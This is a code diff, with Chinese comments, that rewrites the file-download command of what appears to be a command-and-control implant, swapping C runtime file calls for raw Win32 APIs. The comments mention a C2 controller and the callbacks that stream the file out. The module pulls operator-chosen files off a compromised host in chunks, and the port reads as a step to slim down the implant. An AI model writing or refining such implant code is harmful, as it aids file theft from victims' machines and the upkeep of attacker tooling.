@@ -11,7 +11,7 @@
 typedef struct {
 	unsigned int    id;
 	unsigned int    toread;
-	FILE * handle;
+	HANDLE handle; /* Win32 句柄：瘦身——拔掉 CRT stdio 文件 I/O 链 */
  	void * next;
 } file_entry;
 
@@ -19,7 +19,7 @@ typedef struct {
 static void download_entry_cleanup(void * p) {
 	file_entry * entry = (file_entry *)p;
 	if (entry->handle != NULL && entry->handle != INVALID_HANDLE_VALUE)
-		fclose(entry->handle);
+		CloseHandle(entry->handle);
 	memset(entry, 0, sizeof(file_entry));
 	free(entry);
 }
@@ -39,7 +39,7 @@ void process_close(file_entry * entry, void(*callback)(char * buffer, int length
 /* 下载一些内容 */
 void command_download(char * buffer, int length, void (*callback)(char * data, int length, int type)) {
 	file_entry * entry = NULL;
-	FILE * infile;
+	HANDLE infile;
 	char * fname;				/* 用户提供的文件名 */
 	char * fullname;			/* 文件的完整路径 */
 	__int64      fsz;
@@ -60,7 +60,7 @@ void command_download(char * buffer, int length, void (*callback)(char * data, i
 	data_string_oneoff(&parser, fname, 2048);
 
 	/* 打开文件以供读取 */
-	infile = fopen(fname, "rb");
+	infile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (infile == INVALID_HANDLE_VALUE || infile == NULL) {
 		post_error_s(0x28, fname);
 		data_free(chunk);
@@ -68,15 +68,19 @@ void command_download(char * buffer, int length, void (*callback)(char * data, i
 	}
 
 	/* 计算文件大小（存储在fsz中） */
-	fseek(infile, 0L, SEEK_END);
-	fsz = _ftelli64(infile);
-	fseek(infile, 0L, SEEK_SET);
+	{
+		LARGE_INTEGER li;
+		if (!GetFileSizeEx(infile, &li))
+			fsz = 0;
+		else
+			fsz = li.QuadPart;
+	}
 
 	/* 如果这部分失败，请向用户报告错误 */
 	if (fsz <= 0 || fsz > 0xffffffffLL) {
 		post_error_s(0x3c, fname);
 		data_free(chunk);
-		fclose(infile);
+		CloseHandle(infile);
 		return;
 	}
 
@@ -85,7 +89,7 @@ void command_download(char * buffer, int length, void (*callback)(char * data, i
 	if (nsz == 0 || nsz > 2048) {
 		post_error_s(0x3d, fname);
 		data_free(chunk);
-		fclose(infile);
+		CloseHandle(infile);
 		return;
 	}
 
@@ -153,7 +157,8 @@ void process_download(file_entry * entry, void (*callback)(char * buffer, int le
 
 	/* 如果有大量数据要读取，尽可能多地读取 */
 	while (readme > 0) {
-		temp = fread(read_buffer + 4 + len, 1, readme, entry->handle);
+		if (!ReadFile(entry->handle, read_buffer + 4 + len, readme, (DWORD *)&temp, NULL))
+			temp = 0;
 		/* 检查文件下载过程中是否发生错误...这很重要，因为如果不捕获这个错误，
            会导致无限循环。C2控制器需要对CALLBACK_FILE_CLOSE作出反应，
            以检查接收数据<大小并推断发生了错误 */
@@ -181,8 +186,8 @@ void process_close(file_entry * entry, void(*callback)(char * buffer, int length
 	if (entry->toread <= 0) {
 		temp = htonl(entry->id);
 		callback((char *)&temp, 4, CALLBACK_FILE_CLOSE);
-		fclose(entry->handle);
-		entry->handle = NULL; /* 已关闭；置空供 download_entry_cleanup 判定，防双重 fclose */
+		CloseHandle(entry->handle);
+		entry->handle = INVALID_HANDLE_VALUE; /* 已关闭；置位供 cleanup 判定，防双重关闭 */
 	}
 }
 
@@ -200,8 +205,8 @@ void command_download_stop(char * buffer, int length) {
 			entry->toread = 0;
 
 			/* 请关闭句柄 */
-			fclose(entry->handle);
-			entry->handle = NULL;
+			CloseHandle(entry->handle);
+			entry->handle = INVALID_HANDLE_VALUE;
 		}
 		entry = (file_entry*)entry->next;
 	}
